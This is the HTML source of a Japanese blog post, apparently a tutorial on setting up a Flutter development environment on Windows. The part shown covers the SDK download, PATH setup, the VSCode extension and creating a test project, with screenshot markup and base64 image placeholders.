&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#windows%E3%81%A7flutter%E3%81%AE%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B&quot;&gt;WindowsでFlutterの開発環境をつくる&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#fluttersdk%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;FlutterSDKをインストールする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;環境変数を設定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#vscode%E3%81%ABflutter%E3%83%97%E3%83%A9%E3%82%B0%E3%82%A4%E3%83%B3%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot;&gt;VSCodeにFlutterプラグインをインストールする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%86%E3%82%B9%E3%83%88%E3%82%A2%E3%83%97%E3%83%AA%E3%82%92%E4%BD%9C%E3%82%8B&quot;&gt;テストアプリを作る&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A2%E3%83%97%E3%83%AA%E3%82%B1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%82%92%E3%83%93%E3%83%AB%E3%83%89%E3%81%99%E3%82%8B&quot;&gt;アプリケーションをビルドする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%A7%8B%E6%88%90%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot;&gt;構成を確認する&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#macos%E3%81%A7flutter%E3%81%AE%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B&quot;&gt;MacOSでFlutterの開発環境をつくる&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#fluttersdk%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B-1&quot;&gt;FlutterSDKをインストールする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#vscode%E3%81%AE%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97&quot;&gt;VSCodeのセットアップ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;windowsでflutterの開発環境をつくる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windows%E3%81%A7flutter%E3%81%AE%E9%96%8B%E7%99%BA%E7%92%B0%E5%A2%83%E3%82%92%E3%81%A4%E3%81%8F%E3%82%8B&quot; aria-label=&quot;windowsでflutterの開発環境をつくる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WindowsでFlutterの開発環境をつくる&lt;/h2&gt;
&lt;p&gt;まずはWindowsマシンにFlutterの開発環境を構築します。&lt;/p&gt;
&lt;p&gt;ついでにAndroidアプリのエミュレーションもできるようにします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.flutter.dev/get-started/install/windows&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windows install | Flutter&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;fluttersdkをインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#fluttersdk%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;fluttersdkをインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FlutterSDKをインストールする&lt;/h3&gt;
&lt;p&gt;まずは&lt;a href=&quot;https://docs.flutter.dev/get-started/install/windows&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windows install | Flutter&lt;/a&gt;からFlutterSDKをダウンロードしてWindowsマシン上に展開します。&lt;/p&gt;
&lt;p&gt;本記事の執筆時点で最新の&lt;code class=&quot;language-text&quot;&gt;flutter_windows_2.10.3-stable.zip&lt;/code&gt;を使用します。&lt;/p&gt;
&lt;p&gt;ダウンロードしたFlutterSDKを解凍した後、&lt;code class=&quot;language-text&quot;&gt;%USERPROFILE%\Documents\&lt;/code&gt;フォルダの直下に解凍した&lt;code class=&quot;language-text&quot;&gt;flutter&lt;/code&gt;フォルダをコピーします。&lt;/p&gt;
&lt;p&gt;FlutterSDKを配置するフォルダは、ユーザ権限で操作できるフォルダであれば&lt;code class=&quot;language-text&quot;&gt;%USERPROFILE%\Documents\&lt;/code&gt;フォルダの直下以外でも問題なさそうです。&lt;/p&gt;
&lt;h3 id=&quot;環境変数を設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;環境変数を設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;環境変数を設定する&lt;/h3&gt;
&lt;p&gt;次に、先ほど配置したFltterSDKにPATHを通します。&lt;/p&gt;
&lt;p&gt;公式ドキュメントと同じフォルダにSDKを配置している場合は、&lt;code class=&quot;language-text&quot;&gt;%USERPROFILE%\Documents\flutter\bin&lt;/code&gt;をPATHに追加すればOKです。&lt;/p&gt;
&lt;p&gt;PATHを反映させるためにOSの再起動を実施します。&lt;/p&gt;
&lt;p&gt;PATHが反映されているかを確認するために、適当なフォルダでコマンドプロンプトを開き&lt;code class=&quot;language-text&quot;&gt;where flutter dart&lt;/code&gt;を実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;$ where flutter dart
C:\Users\kash1064\Documents\flutter\bin\flutter
C:\Users\kash1064\Documents\flutter\bin\flutter&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bat
C:\Users\kash1064\Documents\flutter\bin\dart
C:\Users\kash1064\Documents\flutter\bin\dart&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bat&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のように&lt;code class=&quot;language-text&quot;&gt;flutter&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;dart&lt;/code&gt;のPATHが表示されていればOKです。&lt;/p&gt;
&lt;h3 id=&quot;vscodeにflutterプラグインをインストールする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#vscode%E3%81%ABflutter%E3%83%97%E3%83%A9%E3%82%B0%E3%82%A4%E3%83%B3%E3%82%92%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B&quot; aria-label=&quot;vscodeにflutterプラグインをインストールする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;VSCodeにFlutterプラグインをインストールする&lt;/h3&gt;
&lt;p&gt;VSCodeをIDEとしてFlutterを使用する場合、Flutter拡張をVSCodeにインストールする必要があります。&lt;/p&gt;
&lt;span class=&quot;gatsby-resp-image-wrapper&quot; style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;&gt;
      &lt;a class=&quot;gatsby-resp-image-link&quot; href=&quot;/static/5cdb987136320bc5dcc8b011a13a98cc/0d0e4/image-20220308221433272.png&quot; style=&quot;display: block&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
    &lt;span class=&quot;gatsby-resp-image-background-image&quot; style=&quot;padding-bottom: 88.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAADWUlEQVQ4y3VUTW/TWBTtthLthqIkjr/tZ8cfsZ2P0sRpp22gVZIG2mqkkWYzzPApKF2yYc2eJT9g9rMaaVYjDfML+gdYUBDVaCQEXYAQRId7X9MorcDS9Xt+9jv33HPP80wURUjSBJ7rwjZNiEoIl+au8CAoXFfAmQpXhvvdmFFVFWVFgW6Y6Nx7jOCHHpIoRC1L4QkXlqHDUBVYWhGGVoZG3+u6/s3QNA0zDKQWC4jW+rj67G947S6CpImstYIwayJpthEnCfLLGaKsAdV0aKMKJnI+GHRGO0VXitB6N1GKc4T5FdR37yLt/Yxs6xfEGz8huX4b1eFviDsb8Im5EAKe501GLveE4ZiqSfrpBMqMhW0g8ByEnivHwPdg20KWbuqq/HY6LMuS4wSQ6SZUVpUiqFQQhNQYyuzTnMdKEEgmXI02RUCSGO8/1XHCkGkHYSSzqeUydFrjD7Wp0aR3luNC1XQCs1Cr1ZCmqUxmGMZZhllWQ7O1jLzdRqfTQSvvIO8sY2VlGcv03Gg0EAgbgaPDI2sxgTiOZWUxWW/SZb7xw2AwoM0rWFpaQjtvo9XOKVpYXLyMpWaGzV8fofHoD6S3nqL/5C9c2/mRbMWyBLDGpU8AWYu1tTUoCpVK1Fn4SxcXcHFhAYVCARfm53Djzn28HQFvPgIHL46wtbUFM2zBrNSpwvJZQK5/nQAN0shwSHzKrNoWtDKZnvScm5vDwwf3wdfo0wccvT7E9WtD6CKF5cUTnU98OGaY5zmJrZHHBKJaHaZPQmsnWRlwf38fn798wbv37/Hy5SF2dnZQjSMsNpuyOdIF0yVzI9gSJrENgwpsPtscjoP5+XkJOBqNcHx8jFeHh9je3obv+wjJGXFchU9NUqcB29Rdhc40z5NqVXqwSO8KZObZ2VkJeHod/fe/ZFgqlWSpLMuZklnDbrdL2U7sUCEwwceKGHJm3rC3t4eDgwP88/w5fv/zX+zu7sp13nv250ATfrG6uorhcIh+v08xwECOm9jc3ECv15O2Yp3r9TrW17vk22xi5uk/ztjYGiqkB4vsug4c6rDr2KSnjlKxCKVEoZQmZZ1KY9v2twH5HycCOsfpIgxBrncC6G4MS9CZ9kNai2HSumHatEmTIA41i4/pecCvJ7k74rQ84eUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;&gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source srcset=&quot;/static/5cdb987136320bc5dcc8b011a13a98cc/8ac56/image-20220308221433272.webp 240w,
/static/5cdb987136320bc5dcc8b011a13a98cc/d3be9/image-20220308221433272.webp 480w,
/static/5cdb987136320bc5dcc8b011a13a98cc/e46b2/image-20220308221433272.webp 960w,
/static/5cdb987136320bc5dcc8b011a13a98cc/fc6cc/image-20220308221433272.webp 1230w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot; type=&quot;image/webp&quot;&gt;
          &lt;source srcset=&quot;/static/5cdb987136320bc5dcc8b011a13a98cc/8ff5a/image-20220308221433272.png 240w,
/static/5cdb987136320bc5dcc8b011a13a98cc/e85cb/image-20220308221433272.png 480w,
/static/5cdb987136320bc5dcc8b011a13a98cc/d9199/image-20220308221433272.png 960w,
/static/5cdb987136320bc5dcc8b011a13a98cc/0d0e4/image-20220308221433272.png 1230w&quot; sizes=&quot;(max-width: 960px) 100vw, 960px&quot; type=&quot;image/png&quot;&gt;
          &lt;img class=&quot;gatsby-resp-image-image&quot; src=&quot;/static/5cdb987136320bc5dcc8b011a13a98cc/d9199/image-20220308221433272.png&quot; alt=&quot;image-20220308221433272&quot; title=&quot;image-20220308221433272&quot; loading=&quot;lazy&quot; style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.flutter.dev/development/tools/vs-code&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Visual Studio Code | Flutter&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;テストアプリを作る&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%86%E3%82%B9%E3%83%88%E3%82%A2%E3%83%97%E3%83%AA%E3%82%92%E4%BD%9C%E3%82%8B&quot; aria-label=&quot;テストアプリを作る permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;テストアプリを作る&lt;/h3&gt;
&lt;p&gt;VSCodeにFlutter拡張をインストールしたら、コマンドパレットから&lt;code class=&quot;language-text&quot;&gt;New Project&lt;/code&gt;を選択してテストアプリのプロジェクトを生成します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 778px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/12e6283dc692a28b724c9efb4eb83c7c/20982/image-20220308221713170.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 28.750000000000004%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY062PzU7CQBSF+w7ohjI/iGKwEKvMT0vaqVFCAqXYqBtXxKXv/wDHO0MwwIYNi2/OzZmTm3Oj3BoYraCVCpoZDeuhOc8sXiqHypVwZbH7I9/uMwdZNZ3iKU0R6dU31OIDz/MW6es7Rq5GUjX/jMo6eA9ufeTv8f7jW4tJVaPbY4h6y19M6i3S5gfj1RZx+YVru8GV2QQ9wpxAXkc3iItPDFyLmAlESTanUxRmdN6M6he5RXI/xG1fYnjTx90ZdhmJgRTgnBpyzmkQYF6FgJAyKOMi+Oc4zDFGC/1zKXy5P+fOtqahyVJPAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/12e6283dc692a28b724c9efb4eb83c7c/8ac56/image-20220308221713170.webp 240w,
/static/12e6283dc692a28b724c9efb4eb83c7c/d3be9/image-20220308221713170.webp 480w,
/static/12e6283dc692a28b724c9efb4eb83c7c/10884/image-20220308221713170.webp 778w&quot;
              sizes=&quot;(max-width: 778px) 100vw, 778px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/12e6283dc692a28b724c9efb4eb83c7c/8ff5a/image-20220308221713170.png 240w,
/static/12e6283dc692a28b724c9efb4eb83c7c/e85cb/image-20220308221713170.png 480w,
/static/12e6283dc692a28b724c9efb4eb83c7c/20982/image-20220308221713170.png 778w&quot;
            sizes=&quot;(max-width: 778px) 100vw, 778px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/12e6283dc692a28b724c9efb4eb83c7c/20982/image-20220308221713170.png&quot;
            alt=&quot;image-20220308221713170&quot;
            title=&quot;image-20220308221713170&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;次の選択肢は&lt;code class=&quot;language-text&quot;&gt;Application&lt;/code&gt;を選択します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 755px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/50317cfc2a7077507ff50ebe553561d1/cab43/image-20220308221900711.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 47.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABj0lEQVQoz3WSTU/CQBCGe1TjxZhgYgwt0g/a3e3SQlsKyoegBBUP6sWb/gM06tGrP/t1dgu1Jnh4MjPv7M7OdGpkeR9pL0emKfw0y5GkGQbnQ0xnV7iYXmIynelckvUov51OtwtjPF/ibLpAPpljMFsgHkwQ5SN0BmPE/RHavSHFBXF/rPVO/5d4Y+meZXsw2Ms3mk9fOFh+4PDuU7O/eMPu1Qp789c/7M5X26GzO4t31FgOI7p9hj26R3N4D3f8AG/yiJN8iVpyjaPkpkIRK73K0ZpausSxw2HkaYKQ+RCBD+63NG3OiACRYBAUKxsJXupxyNFtS0gWwD1taLxmA1a9DuN8OIKUEbgIIUIJISQ4D8G4IE1qvbSkt1oBbNuF7XiEW7COTdOiDmlzQUCdqIJruCpGbNN8n7pyva2UBf+7XMRCo2LGOEKaQiFlW+eVjaJIa6Zp0sj0rylRHd4UCvXoRWGVqz6ozlUfVTg0tkJ3aNsOfQN7LTplUvmu68LzWqWvqPobGg1aiGWhTkv5ARIDOfpL23ggAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/50317cfc2a7077507ff50ebe553561d1/8ac56/image-20220308221900711.webp 240w,
/static/50317cfc2a7077507ff50ebe553561d1/d3be9/image-20220308221900711.webp 480w,
/static/50317cfc2a7077507ff50ebe553561d1/a149a/image-20220308221900711.webp 755w&quot;
              sizes=&quot;(max-width: 755px) 100vw, 755px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/50317cfc2a7077507ff50ebe553561d1/8ff5a/image-20220308221900711.png 240w,
/static/50317cfc2a7077507ff50ebe553561d1/e85cb/image-20220308221900711.png 480w,
/static/50317cfc2a7077507ff50ebe553561d1/cab43/image-20220308221900711.png 755w&quot;
            sizes=&quot;(max-width: 755px) 100vw, 755px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/50317cfc2a7077507ff50ebe553561d1/cab43/image-20220308221900711.png&quot;
            alt=&quot;image-20220308221900711&quot;
            title=&quot;image-20220308221900711&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;プロジェクトが作成されると以下のようにツリーが作成されました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 924px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4815e769ef6fe0fd42a640f9dbc4a0fa/9a1cf/image-20220308221923639.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 72.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACUUlEQVQ4y1VTWXbbMBDTQSqJu1Zqs2V5S17y0o/e/0IohorS+gPPpExiMMAwe//6g9v9jvv9gW274nK5JJzXC+6PBx6Pe9ovywnTNGOaZ8zLgnlesPLMtm3p3vV6Tevs99cXD068tKVLdd3AGAtjHZo+oiXqEBCbgK7rUFcVjNawhFYaZVm+IFvXFTEOqYooCL6C94GkBqVS0FWPiiRj49EGj8Y71M6gtgbOaORFgaLIf5Bdbzf0fZ/aqgKrWwvnPLSW6gq+qnFaBri6RREcjHPIf+U7ciEpXpBJ79O00LONLUU0TZdgSayoUApYEpXGQbkATYWFVtxrFGXxQirrTIyc5jMu24MerlQ70oKZKsPui62h6KOdBvg4wQ8DTNvCMxTfsjDtKXJReyhky2L26XRGoPmWYewtm9S2ln1Tw9JD7USxfBMYGE97Kgdtyt1LkmYyFpFVPz4+cT6vKeE9FMsUFWzXo+cEDEuEiS10bBhU+FbnUtsJR8s3KhzHmfP2xErCiiGEUKeUU9Jsux/OaNlit06IywhPdcX3yOT5aziJcGDKZ7YsCmUeZRalZQmm5CHHvW8bqhVltMVpKF1C2ZKpKyjzjziFMg4j3t7eE3oGIB4mhXZXKJeNJwItqDTXmkU4h41Jext2iMeJsGN62/WWno4EcxAmhYlQIfQW9eT56xCiQ0XI2rf0vLPpf/mWPZ/Pn+d2JHy8lMNDUWhrkkZebjRCa0h0wO5FSCjrbOFDF8KDSCAz+L9CzXXoG1QDMXZwkaFxXGRsSlUkD6VoSfwF4cKZ9vjTwxoAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4815e769ef6fe0fd42a640f9dbc4a0fa/8ac56/image-20220308221923639.webp 240w,
/static/4815e769ef6fe0fd42a640f9dbc4a0fa/d3be9/image-20220308221923639.webp 480w,
/static/4815e769ef6fe0fd42a640f9dbc4a0fa/c3b05/image-20220308221923639.webp 924w&quot;
              sizes=&quot;(max-width: 924px) 100vw, 924px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4815e769ef6fe0fd42a640f9dbc4a0fa/8ff5a/image-20220308221923639.png 240w,
/static/4815e769ef6fe0fd42a640f9dbc4a0fa/e85cb/image-20220308221923639.png 480w,
/static/4815e769ef6fe0fd42a640f9dbc4a0fa/9a1cf/image-20220308221923639.png 924w&quot;
            sizes=&quot;(max-width: 924px) 100vw, 924px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4815e769ef6fe0fd42a640f9dbc4a0fa/9a1cf/image-20220308221923639.png&quot;
            alt=&quot;image-20220308221923639&quot;
            title=&quot;image-20220308221923639&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
